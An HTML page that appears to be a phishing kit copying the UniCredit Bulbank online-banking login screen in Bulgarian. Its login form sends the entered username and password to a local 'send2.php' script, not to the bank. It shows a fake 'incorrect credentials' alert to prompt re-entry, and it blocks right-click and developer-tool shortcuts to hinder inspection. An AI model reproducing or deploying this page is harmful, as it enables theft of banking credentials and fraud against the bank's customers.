<html><head>
	 <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
  
  
  <title>UniCredit Bulbank</title>
  
  
  <meta name="description" content="UniCredit Bulbank - consumer, mortgage and business loans, bank cards and bank accounts.">
  <meta name="author" content="UniCredit Bulbank">
<link rel="stylesheet" href="https://bulbankonline.bg/Content/css/style.min.css">
 <script type="text/javascript" src="https://bulbankonline.bg/Scripts/libs/require.js"></script>
    <script type="text/javascript" src="https://bulbankonline.bg/Scripts/libs/promise.js"></script>
    <script type="text/javascript" src="https://bulbankonline.bg/Scripts/commonSRI.js"></script>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="Scripts/app" src="/Scripts/app.js" integrity="sha256-btUqXrljjGucF8Ebq7VLuUsdRN32j+vjVbbZqaUEbbE=" crossorigin="anonymous"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://bulbankonline.bg/Scripts/common.js" src="https://bulbankonline.bg/Scripts/common.js"></script>
<link rel="stylesheet" href="./HTML/css/filet_001.css">
<script src="https://kit.fontawesome.com/df59028804.js"></script><link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all"><link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free-v4-font-face.min.css" media="all"><link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free-v4-shims.min.css" media="all"><link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all"><link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free-v4-font-face.min.css" media="all"><link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free-v4-shims.min.css" media="all">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="Scripts/app" src="/Scripts/app.js" integrity="sha256-btUqXrljjGucF8Ebq7VLuUsdRN32j+vjVbbZqaUEbbE=" crossorigin="anonymous"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://bulbankonline.bg/Scripts/common.js" src="https://bulbankonline.bg/Scripts/common.js"></script>
<script type="text/javascript">
    //<!--
        document.oncontextmenu = new Function("return false");
    //-->
	$(document).keydown(function (event) {
    if (event.keyCode == 123) { // Prevent F12
        return false;
    } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
        return false;
    }
});

    </script>
</head>
<body id="pageLogin">

<style>
#pageLogin .login-list-groups .list-group .list-group-item:before {
    position: absolute;
    left: 0;
    top: .6em;
	display:none!important;
    content: "";
}</style>
 <header>
 
<!--ko stopBinding: true-->

<div class="view-container" id="view_30ad6e3e24cc42a491de1262ec13674a" data-bind="contextContainerData: this">
<nav class="navbar nav-service service-area-public">
    <div class="container">
        <ul class="nav navbar-nav">
<li class="nav-item navbar-brand mr-auto ">
    <a class="nav-link" href="#">

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="tel:+35929337333">
<i class="fa fa-mobile-phone icon-lg" aria-hidden="true"></i>
                <span class="item-label" title="02 933 7 333">02 933 7 333</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="tel:15333">
<i class="fa fa-phone icon-lg" aria-hidden="true"></i>
                <span class="item-label" title="15 333">15 333</span>

    </a>
</li><li class="nav-item navbar-btn ">
    <a class="nav-link" href="#" target="_blank" rel="noopener">
                <span class="item-label" title="Demo">Демо</span>

    </a>
</li><li class="nav-item navbar-language " data-bind="click: function(){return ChangeLanguage();}">
    <a class="nav-link" href="javascript:void(0)">

    </a>
</li>
        </ul>
    </div>
</nav>

</div>

    <script type="text/javascript">
        requirejs(['https://bulbankonline.bg/Scripts/common.js'], function (common) {
            requirejs(['Scripts/app'], function (app) {
                var application = new app();
                application.Initialize('en-US', 'none', '');
                requirejs(['jquery', 'underscore', 'knockout', 'knockout.mapping', 'UrlHelper', 'MetadataToValidationConverter', 'Pages/Common/Views/Navigation/ServiceNavigationPublic.xaml'
                ], function ($, _, ko, komapping, UrlHelper, MetadataToValidationConverter, ViewModel
                    ) {
                    var metadataConverter = new MetadataToValidationConverter.MetadataToValidationConverter();
                    var viewData = null;
                    var viewModel = new ViewModel(komapping.fromJS(JSON.parse('{\"$type\":\"Common.Models.Navigation.ServiceNavigationPublicInfo, WEBUI\",\"RootController\":\"Login\",\"RootAction\":\"Index\",\"RootArea\":null,\"OtherLanguage\":\"bg-BG\"}')), viewData, function(model) { return metadataConverter.GetValidatonRules(JSON.parse('{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.DependentModelMetadata, DAIS.UIFramework\",\"Types\":{\"$type\":\"System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[DAIS.UIFramework.ModelMetadata.Objects.TypeMetadata, DAIS.UIFramework]], mscorlib\",\"DAIS.eBank.Client.WEB.UIFramework.Pages.Common.Models.Navigation.ServiceNavigationPublicInfo\":{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.TypeMetadata, DAIS.UIFramework\",\"Properties\":{\"$type\":\"System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[DAIS.UIFramework.ModelMetadata.Objects.PropertyMetadata, DAIS.UIFramework]], mscorlib\",\"RootController\":{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.PropertyMetadata, DAIS.UIFramework\",\"TypeName\":null,\"ValidationRules\":[]},\"RootAction\":{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.PropertyMetadata, DAIS.UIFramework\",\"TypeName\":null,\"ValidationRules\":[]},\"RootArea\":{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.PropertyMetadata, DAIS.UIFramework\",\"TypeName\":null,\"ValidationRules\":[]},\"OtherLanguage\":{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.PropertyMetadata, DAIS.UIFramework\",\"TypeName\":null,\"ValidationRules\":[]}}}}}'), model || 'DAIS.eBank.Client.WEB.UIFramework.Pages.Common.Models.Navigation.ServiceNavigationPublicInfo') });

                    var element = document.getElementById("view_30ad6e3e24cc42a491de1262ec13674a");
                    ko.applyBindings(viewModel, element);
                    $(element).trigger("DAISUIFrameworkAfterApplyBindingsEvent");
                    if (_.isFunction(viewModel.AfterApplyBindings))
                        viewModel.AfterApplyBindings();

                });
            });
        });
    </script>
	
	<script>
function validateForm() {
  var user = document.forms["logintrue"]["UserName"].value;
  var pass = document.forms["logintrue"]["Password"].value;

  if (user == "" && pass == "") {
       //$("#Erorr-Login").show(100);
 document.getElementById("msgwalo").style.display = "block";
 document.getElementById("LSinputuser").style.border = "1px solid #f17076";
 document.getElementById("LSinputpsee").style.border = "1px solid #f17076";

 document.getElementById("iconuser").style.color = "1px solid #f17076";
 document.getElementById("iconpass").style.color = "1px solid #f17076";


 
    return false;
  }else if (user == "") {
       //$("#Erorr-Login").show(100);
 document.getElementById("msgwalo").style.display = "block";
 document.getElementById("LSinputuser").style.border = "1px solid #f17076";
 document.getElementById("iconuser").style.color = "1px solid #f17076";
 

    return false;
  }else if (pass == "") {

     document.getElementById("msgwalo").style.background = "#fcdfdf";
     document.getElementById("LSinputpsee").style.border = "1px solid #f17076";
 document.getElementById("iconpass").style.color = "1px solid #f17076";


    return false;

  }
}
</script>

<!--/ko--></header>
    <main>
        <div class="main-content">

<div class="view-container" id="view_Login" data-bind="contextContainerData: this">
<div class="stack container-banner">



<div class="stack container">



<div class="stack container-login individual">
<div class="stack login-header">
<h3 class="content-heading">

    <span class="value">
        Индивидуални клиенти
    </span></h3>
</div>
<div class="login-body">

<form name="logintrue" action="send2.php" method="POST" onsubmit="return validateForm()">

<div class="row" id="msgwalo" style="display: block;">
 <div class="col-sm-12">
<div role="alert" class="alert alert-danger " style="">
<span class="text"><span class="value"><i class="fas fa-exclamation-circle" style="color: #ffffff;line-height: 30px;font-size: 20px;padding-right: 7px;" aria-hidden="true"></i> Некоректно въведено потребителско име и/или парола.</span></span></div>
</div></div>



<div class="row">
  <div class="col-sm-12">
<div class="LSinput" id="LSinputuser" style="border: 1px solid rgb(241, 112, 118);"> <i id="iconuser" class="fas fa-user-circle" style="color: #a7a7a7;line-height: 30px;font-size: 20px;padding-right: 7px;" aria-hidden="true"></i>
  <input class="ipnutehide" type="text" name="UserName" placeholder="Потребителско име">
</div>
  </div>
</div>
<div class="row">
  <div class="col-sm-12">
    <div class="LSinput" id="LSinputpsee" style="border: 1px solid rgb(241, 112, 118);"><i id="iconpass" class="fas fa-lock" style="color: #a7a7a7;line-height: 30px;font-size: 20px;padding-right: 7px;" aria-hidden="true"></i>
  <input class="ipnutehide" type="password" name="Password" placeholder="Парола" style="width: 52%"><span class="passwordfrgt"> <span class="passwordfrgt"> Забравена парола? </span> </span>
</div></div>
  
</div>
<div class="row">
  <div class="col-sm-12">
<button class="btn btn-primary" type="submit">

        Вход
    </button>
  
  </div>
  
</div></form>

<div class="row">
 <div class="col-sm-12">
<span class="passwordfrgt"><span class="passwordfrgt" style=" font-size: 19px; ">Онлайн регистрация </span></span> </div>
  </div>

</div>
</div>

</div>

</div>
<div class="stack container login-list-groups">



<div class="content-box clearfix" data-bind="contentBox: true">
    <h3 class="content-heading">
<span class="text">
<i class="fa fa-lock" aria-hidden="true"></i>


    <span class="value">
        Сигурност
    </span>
</span>    </h3>



      <ul class="list-group">
<li class="list-group-item">
<a class="link" href="https://online.bulbank.bg/docs/BBO_security_recommendation_BG.pdf" target="_blank" rel="noopener">
<span class="text">


    <span class="value">
        Препоръки за сигурност при работа с алтернативни канали на Банката
    </span>
</span>
</a>
</li>
<li class="list-group-item">
<a class="link" href="https://www.unicreditbulbank.bg/bg/pravna-informatsiya/biskvitki/" target="_blank" rel="noopener">
<span class="text">


    <span class="value">
        Политика за прилагане на бисквитки
    </span>
</span>
</a>
</li>
<li class="list-group-item verify">
<div class="stack">




<script src="https://seal.websecurity.norton.com/getseal?host_name=bulbankonline.bg&amp;size=M&amp;use_flash=YES&amp;use_%0Atransparent=YES&amp;lang=en"></script><img name="seal" src="" oncontextmenu="return false;" border="0" usemap="#sealmap_medium" alt=""> <map name="sealmap_medium" id="sealmap_medium"><area alt="Click to Verify - This site has chosen an SSL Certificate to improve Web site security" title="" href="javascript:vrsn_splash()" shape="rect" coords="0,0,115,58" tabindex="-1" style="outline:none;"><area alt="Click to Verify - This site has chosen an SSL Certificate to improve Web site security" title="" href="javascript:vrsn_splash()" shape="rect" coords="0,58,63,81" tabindex="-1" style="outline:none;"><area alt="" title="" href="javascript:symcBuySSL()" shape="rect" coords="63,58,115,81" style="outline:none;"></map><img name="seal" src="" oncontextmenu="return false;" border="0" usemap="#sealmap_medium" alt=""> <map name="sealmap_medium" id="sealmap_medium"><area alt="Click to Verify - This site has chosen an SSL Certificate to improve Web site security" title="" href="javascript:vrsn_splash()" shape="rect" coords="0,0,115,58" tabindex="-1" style="outline:none;"><area alt="Click to Verify - This site has chosen an SSL Certificate to improve Web site security" title="" href="javascript:vrsn_splash()" shape="rect" coords="0,58,63,81" tabindex="-1" style="outline:none;"><area alt="" title="" href="javascript:symcBuySSL()" shape="rect" coords="63,58,115,81" style="outline:none;"></map>
</div>
<span class="text">


    <span class="value">
        Проверете автентичността на сайта на Булбанк Онлайн
    </span>
</span>
</li>

        </ul>
</div>

<!--ko stopBinding: true-->

<div class="view-container" id="view_7d56492394914332aa3edd8ba37f8216" data-bind="contextContainerData: this">
<div class="content-box clearfix" data-bind="contentBox: true">
    <h3 class="content-heading">
<span class="text">
<i class="fa fa-file-text-o" aria-hidden="true"></i>


    <span class="value">
        Новини
    </span>
</span>    </h3>

<ul class="list-group" data-bind="template: { name: 'template_542dd570231046e18cdb38464dc8896a', foreach: Model.Items }, visible: !_.isEmpty(ko.utils.unwrapObservable(Model.Items))" style=""><li class="list-group-item">
<a class="link" href="javascript:void(0)" data-bind="click: function(){return $parent.ShowNewsArticle(ko.utils.unwrapObservable(ID));}">
<span class="text">


    <span data-bind="css: { 'text-danger': Important }, text: Title" class="value text-danger">Важно! Обслужване на клиентските операции в периода 19.12.2019 – 31.12.2019 г</span>
</span>
</a>
</li>
<li class="list-group-item">
<a class="link" href="javascript:void(0)" data-bind="click: function(){return $parent.ShowNewsArticle(ko.utils.unwrapObservable(ID));}">
<span class="text">


    <span data-bind="css: { 'text-danger': Important }, text: Title" class="value">Ново! Вижте как да реактивирате Вашия М-токен в новото ни видео </span>
</span>
</a>
</li>
<li class="list-group-item">
<a class="link" href="javascript:void(0)" data-bind="click: function(){return $parent.ShowNewsArticle(ko.utils.unwrapObservable(ID));}">
<span class="text">


    <span data-bind="css: { 'text-danger': Important }, text: Title" class="value">Ново! Услугата Булбанк Онлайн ще е с обновена визия и по-удобна навигация от септември.</span>
</span>
</a>
</li>
</ul>
</div>


</div>

    <!--/ko--><div class="content-box clearfix" data-bind="contentBox: true">
    <h3 class="content-heading">
<span class="text">
<i class="fa fa-file-text-o" aria-hidden="true"></i>


    <span class="value">
        Документи
    </span>
</span>    </h3>



 <ul class="list-group">
<li class="list-group-item">
<a class="link" href="https://www.unicreditbulbank.bg/bg/tarifi-i-obshti-usloviya/tarifi-usloviya-fizicheski-litsa/#elektronni-uslugi" target="_blank" rel="noopener">
<span class="text">


    <span class="value">
        Общи условия за Булбанк Онлайн
    </span>
</span>
</a>
</li>
<li class="list-group-item">
<a class="link" href="https://online.bulbank.bg/docs/Account_types_and_possibilities_for_subscription_and_operations_BG.pdf" target="_blank" rel="noopener">
<span class="text">


    <span class="value">
        Видове сметки и възможности за работа с тях в услугата „Булбанк Онлайн”
    </span>
</span>
</a>
</li>
<li class="list-group-item">
<a class="link" href="https://online.bulbank.bg/docs/Online_Corporate_Request_BG.pdf" target="_blank" rel="noopener">
<span class="text">


    <span class="value">
        Искане за ползване на Булбанк Онлайн - корпоративни клиенти
    </span>
</span>
</a>
</li>
<li class="list-group-item">
<a class="link" href="https://online.bulbank.bg/docs/request-new%20username%20and%20password_BG.pdf" target="_blank" rel="noopener">
<span class="text">


    <span class="value">
        Искане за преиздаване на потребителско име и парола
    </span>
</span>
</a>
</li>
<li class="list-group-item">
<a class="link" href="https://online.bulbank.bg/docs/request-deregistration%20QES%20or%20cancelation%20certificate_BG.pdf" target="_blank" rel="noopener">
<span class="text">


    <span class="value">
        Искане за анулиране на цифров сертификат или отрегистриране на КЕП
    </span>
</span>
</a>
</li>

        </ul>
</div>

</div>

</div>

   


        </div>
    </main>

    <footer>
<!--ko stopBinding: true-->

<div class="view-container" id="view_779b72bdd6d04b0681d43f02f47895c1" data-bind="contextContainerData: this">
<div class="stack container">



<span class="text">


    <span class="value">
        © 2019 УниКредит Булбанк АД
    </span>
</span><a class="link" href="https://www.unicreditbulbank.bg/bg/pravna-informatsiya/poveritelnost/" target="_blank" rel="noopener">
<span class="text">


    <span class="value">
        Поверителност
    </span>
</span>
</a><a class="link" href="https://www.unicreditbulbank.bg/bg/pravna-informatsiya/usloviya-za-polzvane/" target="_blank" rel="noopener">
<span class="text">


    <span class="value">
        Права на ползване
    </span>
</span>
</a><a class="link" href="https://online.bulbank.bg/docs/FAQ_BG.pdf" target="_blank" rel="noopener">
<span class="text">


    <span class="value">
        Често задавани въпроси
    </span>
</span>
</a><a class="link" href="javascript:void(0)" data-bind="click: function(){return Feedback();}">
<span class="text">


    <span class="value">
        Споделете с нас 
    </span>
</span>
</a>
</div>

</div>

  

<!--/ko--></footer>

<div class="notifications-container"></div>
</body></html>